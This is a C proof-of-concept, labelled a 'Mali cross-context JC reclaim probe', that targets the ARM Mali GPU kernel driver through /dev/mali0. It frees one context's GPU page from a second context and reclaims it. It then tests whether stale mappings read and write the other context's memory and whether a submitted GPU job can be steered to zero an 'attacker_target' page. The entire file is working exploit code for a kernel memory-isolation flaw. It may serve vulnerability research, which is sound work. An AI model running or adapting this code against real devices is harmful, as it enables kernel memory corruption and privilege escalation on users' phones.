#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define MALI_IOCTL(size) _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, (size))

#define UKP_FUNC_ID_CHECK_VERSION 0
#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC   (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_FREE    (UK_FUNC_ID + 4)
#define KBASE_FUNC_SET_FLAGS   (UK_FUNC_ID + 18)
#define KBASE_FUNC_JOB_SUBMIT  (UK_FUNC_ID + 28)

#define BASE_MEM_PROT_CPU_RD    (1U << 0)
#define BASE_MEM_PROT_CPU_WR    (1U << 1)
#define BASE_MEM_PROT_GPU_RD    (1U << 2)
#define BASE_MEM_PROT_GPU_WR    (1U << 3)
#define BASE_MEM_COHERENT_LOCAL (1U << 11)

#define BASE_JD_REQ_CS          (1U << 1)

#define MALI_JOB_TYPE_WRITE_VALUE 2
#define MALI_WRITE_VALUE_TYPE_ZERO 3

#define BASE_JD_EVENT_DONE               0x00000001
#define BASE_JD_EVENT_DATA_INVALID_FAULT 0x00000058
#define BASE_JD_EVENT_JOB_CANCELLED      0x00004002
#define BASE_JD_EVENT_JOB_INVALID        0x00004003

#define TAG_CTX1  0x1111111111111111ULL
#define TAG_CTX2  0x2222222222222222ULL
#define TAG_BIDIR 0x3333333333333333ULL

typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t align;
} uk_header;

struct uku_version_check_args {
    uk_header header;
    uint16_t major;
    uint16_t minor;
    uint8_t padding[4];
};

struct kbase_uk_set_flags {
    uk_header header;
    uint32_t create_flags;
    uint32_t padding;
};

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t pad1[6];
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t gpu_addr;
};

struct base_jd_udata {
    uint64_t blob[2];
};

struct base_dependency {
    uint8_t atom_id;
    uint8_t dependency_type;
};

struct base_jd_atom_v2_old56 {
    uint64_t jc;
    struct base_jd_udata udata;
    uint64_t extres_list;
    uint16_t nr_extres;
    uint16_t core_req;
    struct base_dependency pre_dep[2];
    uint8_t atom_number;
    uint8_t prio;
    uint8_t device_nr;
    uint8_t padding[5];
    uint8_t extra[8];
};

struct kbase_uk_job_submit_trace {
    uk_header header;
    uint64_t addr;
    uint32_t nr_atoms;
    uint32_t stride;
    uint32_t gles_ctx_handle;
    uint32_t padding;
};

struct base_jd_event_v2 {
    uint32_t event_code;
    uint8_t atom_number;
    uint8_t pad[3];
    struct base_jd_udata udata;
};

static sigjmp_buf g_fault_jmp;
static volatile sig_atomic_t g_faulted;

static void fault_handler(int sig)
{
    (void)sig;
    g_faulted = 1;
    siglongjmp(g_fault_jmp, 1);
}

static int install_fault_handlers(struct sigaction *old_segv, struct sigaction *old_bus)
{
    struct sigaction sa;

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGSEGV, &sa, old_segv) < 0)
        return -1;
    if (sigaction(SIGBUS, &sa, old_bus) < 0) {
        sigaction(SIGSEGV, old_segv, NULL);
        return -1;
    }
    return 0;
}

static void restore_fault_handlers(const struct sigaction *old_segv, const struct sigaction *old_bus)
{
    sigaction(SIGSEGV, old_segv, NULL);
    sigaction(SIGBUS, old_bus, NULL);
}

static int safe_read64(volatile uint64_t *addr, uint64_t *out)
{
    struct sigaction old_segv, old_bus;

    if (install_fault_handlers(&old_segv, &old_bus) < 0)
        return -1;

    g_faulted = 0;
    if (sigsetjmp(g_fault_jmp, 1) == 0)
        *out = *addr;
    restore_fault_handlers(&old_segv, &old_bus);
    return g_faulted ? -1 : 0;
}

static int safe_write64(volatile uint64_t *addr, uint64_t value)
{
    struct sigaction old_segv, old_bus;

    if (install_fault_handlers(&old_segv, &old_bus) < 0)
        return -1;

    g_faulted = 0;
    if (sigsetjmp(g_fault_jmp, 1) == 0)
        *addr = value;
    restore_fault_handlers(&old_segv, &old_bus);
    return g_faulted ? -1 : 0;
}

static int mali_ioctl(int fd, void *buf, size_t size)
{
    errno = 0;
    return ioctl(fd, MALI_IOCTL(size), buf);
}

static const char *event_name(uint32_t code)
{
    switch (code) {
    case BASE_JD_EVENT_DONE:
        return "DONE";
    case BASE_JD_EVENT_DATA_INVALID_FAULT:
        return "DATA_INVALID_FAULT";
    case BASE_JD_EVENT_JOB_CANCELLED:
        return "JOB_CANCELLED";
    case BASE_JD_EVENT_JOB_INVALID:
        return "JOB_INVALID";
    default:
        return "UNKNOWN";
    }
}

static int mali_init(int fd)
{
    struct uku_version_check_args ver;
    struct kbase_uk_set_flags flags;

    memset(&ver, 0, sizeof(ver));
    ver.header.id = UKP_FUNC_ID_CHECK_VERSION;
    ver.major = 10;
    ver.minor = 2;
    if (mali_ioctl(fd, &ver, sizeof(ver)) < 0 || ver.header.ret != 0)
        return -1;

    memset(&flags, 0, sizeof(flags));
    flags.header.id = KBASE_FUNC_SET_FLAGS;
    if (mali_ioctl(fd, &flags, sizeof(flags)) < 0 || flags.header.ret != 0)
        return -1;
    return 0;
}

static int mali_setup_mtp(int fd)
{
    void *mtp;

    mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)4096,
                          PROT_NONE, MAP_SHARED, fd, (unsigned long)2);
    if (mtp == MAP_FAILED) {
        mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)4096,
                              PROT_NONE, MAP_SHARED, fd, (unsigned long)3);
    }
    return mtp == MAP_FAILED ? -1 : 0;
}

static int mali_open_ctx(int nonblock)
{
    int flags = O_RDWR | O_CLOEXEC;
    int fd;

    if (nonblock)
        flags |= O_NONBLOCK;
    fd = open("/dev/mali0", flags);
    if (fd < 0)
        return -1;
    if (mali_init(fd) < 0 || mali_setup_mtp(fd) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static uint64_t mali_alloc_page(int fd)
{
    struct kbase_uk_mem_alloc alloc;

    memset(&alloc, 0, sizeof(alloc));
    alloc.header.id = KBASE_FUNC_MEM_ALLOC;
    alloc.va_pages = 1;
    alloc.commit_pages = 1;
    alloc.extent = 1;
    alloc.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                  BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                  BASE_MEM_COHERENT_LOCAL;
    if (mali_ioctl(fd, &alloc, sizeof(alloc)) < 0)
        return 0;
    return alloc.header.ret == 0 ? alloc.gpu_va : 0;
}

static uint32_t mali_free_checked(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_free mf;

    memset(&mf, 0, sizeof(mf));
    mf.header.id = KBASE_FUNC_MEM_FREE;
    mf.gpu_addr = gpu_va;
    if (mali_ioctl(fd, &mf, sizeof(mf)) < 0)
        return 0xFFFFFFFFU;
    return mf.header.ret;
}

static void *mali_cpu_map(int fd, uint64_t gpu_va)
{
    return (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)4096,
                           PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                           (unsigned long)(gpu_va >> 12));
}

static void pack_write_value_desc(uint32_t *cl, uint64_t target_gpu_va)
{
    memset(cl, 0, 56);
    cl[4] = 0x00010005;
    cl[8] = (uint32_t)target_gpu_va;
    cl[9] = (uint32_t)(target_gpu_va >> 32);
    cl[10] = MALI_WRITE_VALUE_TYPE_ZERO;
}

static int submit_zero_job(int fd, uint64_t jc_gpu_va, uint8_t atom_number)
{
    struct base_jd_atom_v2_old56 atom;
    struct kbase_uk_job_submit_trace submit;
    int rc;

    memset(&atom, 0, sizeof(atom));
    atom.jc = jc_gpu_va;
    atom.udata.blob[0] = 0xABCD000000000000ULL | atom_number;
    atom.udata.blob[1] = 0xDCBA000000000000ULL | atom_number;
    atom.core_req = BASE_JD_REQ_CS;
    atom.atom_number = atom_number;

    memset(&submit, 0, sizeof(submit));
    submit.header.id = KBASE_FUNC_JOB_SUBMIT;
    submit.addr = (uint64_t)(uintptr_t)&atom;
    submit.nr_atoms = 1;
    submit.stride = sizeof(atom);
    rc = mali_ioctl(fd, &submit, sizeof(submit));
    return (rc == 0 && submit.header.ret == 0) ? 0 : -1;
}

static int read_event(int fd, struct base_jd_event_v2 *ev)
{
    struct pollfd pfd;
    ssize_t n;

    memset(&pfd, 0, sizeof(pfd));
    pfd.fd = fd;
    pfd.events = POLLIN | POLLERR | POLLHUP;
    if (poll(&pfd, 1, 1000) <= 0)
        return -1;
    n = read(fd, ev, sizeof(*ev));
    return n == (ssize_t)sizeof(*ev) ? 0 : -1;
}

static void flush_page(void *page)
{
    if (page != MAP_FAILED)
        msync(page, 4096, MS_SYNC | MS_INVALIDATE);
}

static void run_cpu_overlap_case(void)
{
    int fd1 = -1, fd2 = -1;
    uint64_t ctx1_gpu_va = 0, claim_gpu_va = 0;
    uint32_t xfree_ret = 0xFFFFFFFFU;
    volatile uint64_t *ctx1_cpu = MAP_FAILED;
    volatile uint64_t *claim_cpu = MAP_FAILED;
    uint64_t v = 0;
    uint64_t claim_seen = 0;
    int read_rc;
    int bidir_rc;

    printf("\n=== Case 1: cross-context reclaim of CPU-mapped page ===\n");

    fd1 = mali_open_ctx(0);
    fd2 = mali_open_ctx(0);
    if (fd1 < 0 || fd2 < 0) {
        printf("open/init failed fd1=%d fd2=%d\n", fd1, fd2);
        goto out;
    }

    ctx1_gpu_va = mali_alloc_page(fd1);
    if (!ctx1_gpu_va)
        goto out;
    ctx1_cpu = (volatile uint64_t *)mali_cpu_map(fd1, ctx1_gpu_va);
    if ((void *)ctx1_cpu == MAP_FAILED)
        goto out;

    memset((void *)ctx1_cpu, 0x11, 4096);
    ctx1_cpu[0] = TAG_CTX1;
    ctx1_cpu[1] = TAG_CTX1 ^ 0x55ULL;
    flush_page((void *)ctx1_cpu);
    printf("ctx1 page gpu_va=0x%llx tag0=0x%016llx\n",
           (unsigned long long)ctx1_gpu_va,
           (unsigned long long)ctx1_cpu[0]);

    xfree_ret = mali_free_checked(fd2, ctx1_gpu_va);
    printf("ctx2 MEM_FREE(ctx1 gpu_va)=0x%x\n", xfree_ret);

    claim_gpu_va = mali_alloc_page(fd2);
    claim_cpu = (volatile uint64_t *)mali_cpu_map(fd2, claim_gpu_va);
    if (!claim_gpu_va || (void *)claim_cpu == MAP_FAILED)
        goto out;

    memset((void *)claim_cpu, 0x22, 4096);
    claim_cpu[0] = TAG_CTX2;
    claim_cpu[1] = TAG_CTX2 ^ 0xAAULL;
    flush_page((void *)claim_cpu);
    printf("ctx2 claim gpu_va=0x%llx (same_va=%s) tag0=0x%016llx\n",
           (unsigned long long)claim_gpu_va,
           claim_gpu_va == ctx1_gpu_va ? "yes" : "no",
           (unsigned long long)claim_cpu[0]);

    read_rc = safe_read64(&ctx1_cpu[0], &v);
    if (read_rc < 0) {
        printf("ctx1 stale CPU map faulted after xfree+claim\n");
    } else {
        printf("ctx1 stale CPU map reads 0x%016llx\n", (unsigned long long)v);
        if (v == TAG_CTX2)
            printf("OVERLAP: ctx1 stale mapping now sees ctx2 claim contents\n");
    }

    bidir_rc = safe_write64(&ctx1_cpu[0], TAG_BIDIR);
    if (bidir_rc == 0) {
        flush_page((void *)ctx1_cpu);
        flush_page((void *)claim_cpu);
        claim_seen = claim_cpu[0];
        printf("ctx1 stale write tag=0x%016llx -> ctx2 claim now 0x%016llx\n",
               (unsigned long long)TAG_BIDIR,
               (unsigned long long)claim_seen);
        if (claim_seen == TAG_BIDIR)
            printf("OVERLAP: ctx1 stale write changed ctx2 claim page\n");
    } else {
        printf("ctx1 stale CPU write faulted after xfree+claim\n");
    }

out:
    if ((void *)claim_cpu != MAP_FAILED)
        munmap((void *)claim_cpu, 4096);
    if ((void *)ctx1_cpu != MAP_FAILED)
        munmap((void *)ctx1_cpu, 4096);
    if (claim_gpu_va)
        mali_free_checked(fd2, claim_gpu_va);
    if (ctx1_gpu_va && xfree_ret != 0)
        mali_free_checked(fd1, ctx1_gpu_va);
    if (fd2 >= 0)
        close(fd2);
    if (fd1 >= 0)
        close(fd1);
}

static void run_jc_reclaim_case(void)
{
    int fd1 = -1, fd2 = -1;
    uint64_t jc_gpu_va = 0, scratch_gpu_va = 0, dest_gpu_va = 0, claim_gpu_va = 0;
    uint32_t xfree_ret = 0xFFFFFFFFU;
    uint32_t *jc_cpu = MAP_FAILED;
    uint32_t *claim_cpu = MAP_FAILED;
    volatile uint64_t *scratch_cpu = MAP_FAILED;
    volatile uint64_t *dest_cpu = MAP_FAILED;
    struct base_jd_event_v2 ev;
    uint64_t jc_target = 0;

    printf("\n=== Case 2: reclaimed JC page steering ===\n");

    fd1 = mali_open_ctx(1);
    fd2 = mali_open_ctx(0);
    if (fd1 < 0 || fd2 < 0) {
        printf("open/init failed fd1=%d fd2=%d\n", fd1, fd2);
        goto out;
    }

    jc_gpu_va = mali_alloc_page(fd1);
    scratch_gpu_va = mali_alloc_page(fd1);
    dest_gpu_va = mali_alloc_page(fd1);
    if (!jc_gpu_va || !scratch_gpu_va || !dest_gpu_va)
        goto out;

    jc_cpu = (uint32_t *)mali_cpu_map(fd1, jc_gpu_va);
    scratch_cpu = (volatile uint64_t *)mali_cpu_map(fd1, scratch_gpu_va);
    dest_cpu = (volatile uint64_t *)mali_cpu_map(fd1, dest_gpu_va);
    if (jc_cpu == MAP_FAILED || (void *)scratch_cpu == MAP_FAILED || (void *)dest_cpu == MAP_FAILED)
        goto out;

    memset((void *)scratch_cpu, 0xAA, 4096);
    memset((void *)dest_cpu, 0xBB, 4096);
    pack_write_value_desc(jc_cpu, scratch_gpu_va);
    flush_page(jc_cpu);
    flush_page((void *)scratch_cpu);
    flush_page((void *)dest_cpu);
    jc_target = ((uint64_t)jc_cpu[9] << 32) | jc_cpu[8];
    printf("ctx1 jc gpu_va=0x%llx original_target=0x%llx scratch=0x%016llx dest=0x%016llx\n",
           (unsigned long long)jc_gpu_va,
           (unsigned long long)jc_target,
           (unsigned long long)scratch_cpu[0],
           (unsigned long long)dest_cpu[0]);

    xfree_ret = mali_free_checked(fd2, jc_gpu_va);
    printf("ctx2 MEM_FREE(ctx1 jc)=0x%x\n", xfree_ret);

    claim_gpu_va = mali_alloc_page(fd2);
    claim_cpu = (uint32_t *)mali_cpu_map(fd2, claim_gpu_va);
    if (!claim_gpu_va || claim_cpu == MAP_FAILED)
        goto out;

    pack_write_value_desc(claim_cpu, dest_gpu_va);
    flush_page(claim_cpu);
    printf("ctx2 claim gpu_va=0x%llx (same_va=%s) attacker_target=0x%llx\n",
           (unsigned long long)claim_gpu_va,
           claim_gpu_va == jc_gpu_va ? "yes" : "no",
           (unsigned long long)(((uint64_t)claim_cpu[9] << 32) | claim_cpu[8]));

    if (safe_read64((volatile uint64_t *)&jc_cpu[8], &jc_target) == 0) {
        printf("ctx1 jc target after xfree+claim = 0x%llx\n",
               (unsigned long long)jc_target);
    } else {
        printf("ctx1 jc page read faulted after xfree+claim\n");
    }

    if (submit_zero_job(fd1, jc_gpu_va, 1) < 0) {
        printf("JOB_SUBMIT failed\n");
        goto out;
    }
    if (read_event(fd1, &ev) < 0) {
        printf("event read failed\n");
        goto out;
    }

    flush_page((void *)scratch_cpu);
    flush_page((void *)dest_cpu);
    printf("event=0x%08x(%s) scratch=0x%016llx dest=0x%016llx\n",
           ev.event_code, event_name(ev.event_code),
           (unsigned long long)scratch_cpu[0],
           (unsigned long long)dest_cpu[0]);

    if (scratch_cpu[0] == 0 && dest_cpu[0] != 0)
        printf("RESULT: original ctx1 JC page still executed\n");
    else if (scratch_cpu[0] != 0 && dest_cpu[0] == 0)
        printf("RESULT: reclaimed ctx2 page steered ctx1 JC execution\n");
    else if (scratch_cpu[0] == 0 && dest_cpu[0] == 0)
        printf("RESULT: ambiguous; both targets were zeroed\n");
    else
        printf("RESULT: no successful zero-write observed\n");

out:
    if (claim_cpu != MAP_FAILED)
        munmap(claim_cpu, 4096);
    if ((void *)dest_cpu != MAP_FAILED)
        munmap((void *)dest_cpu, 4096);
    if ((void *)scratch_cpu != MAP_FAILED)
        munmap((void *)scratch_cpu, 4096);
    if (jc_cpu != MAP_FAILED)
        munmap(jc_cpu, 4096);
    if (claim_gpu_va)
        mali_free_checked(fd2, claim_gpu_va);
    if (dest_gpu_va)
        mali_free_checked(fd1, dest_gpu_va);
    if (scratch_gpu_va)
        mali_free_checked(fd1, scratch_gpu_va);
    if (jc_gpu_va && xfree_ret != 0)
        mali_free_checked(fd1, jc_gpu_va);
    if (fd2 >= 0)
        close(fd2);
    if (fd1 >= 0)
        close(fd1);
}

static void run_probe(void)
{
    run_cpu_overlap_case();
    run_jc_reclaim_case();
}

int main(void)
{
    pid_t pid;
    int status = 0;

    printf("=== Mali cross-context JC reclaim probe ===\n");
    pid = fork();
    if (pid < 0)
        return 1;
    if (pid == 0) {
        alarm(20);
        run_probe();
        _exit(0);
    }
    waitpid(pid, &status, 0);
    return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
}
